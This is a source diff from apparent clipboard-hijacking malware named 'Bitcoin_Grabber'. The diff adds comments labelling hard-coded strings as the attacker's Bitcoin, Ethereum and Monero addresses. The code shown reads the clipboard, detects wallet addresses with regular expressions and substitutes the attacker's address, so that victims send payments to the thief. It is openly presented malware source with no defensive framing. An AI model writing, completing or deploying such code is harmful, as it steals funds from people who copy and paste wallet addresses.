@@ -84,13 +84,13 @@ namespace Bitcoin_Grabber
                 {
                     string currentClipboard = Clipboard.GetText();
 
-                    string btcReplacement = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw";
+                    string btcReplacement = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"; //attacker's btc address
                     Regex btcPattern = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc
 
-                    string ethereumReplacement = "Ethereum";
+                    string ethereumReplacement = "Ethereum"; //attacker's eth address
                     Regex ethereumPattern = new Regex(@"\b0x[a-fA-F0-9]{40}\b"); //ethereum
 
-                    string xmrReplacement = "XMR";
+                    string xmrReplacement = "XMR"; //attacker's xmr address
                     Regex xmrPattern = new Regex(@"\b4([0-9]|[A-B])(.){93}\b"); //xmr
 
                     if (btcPattern.Match(currentClipboard).Success && !currentClipboard.Contains(btcReplacement))
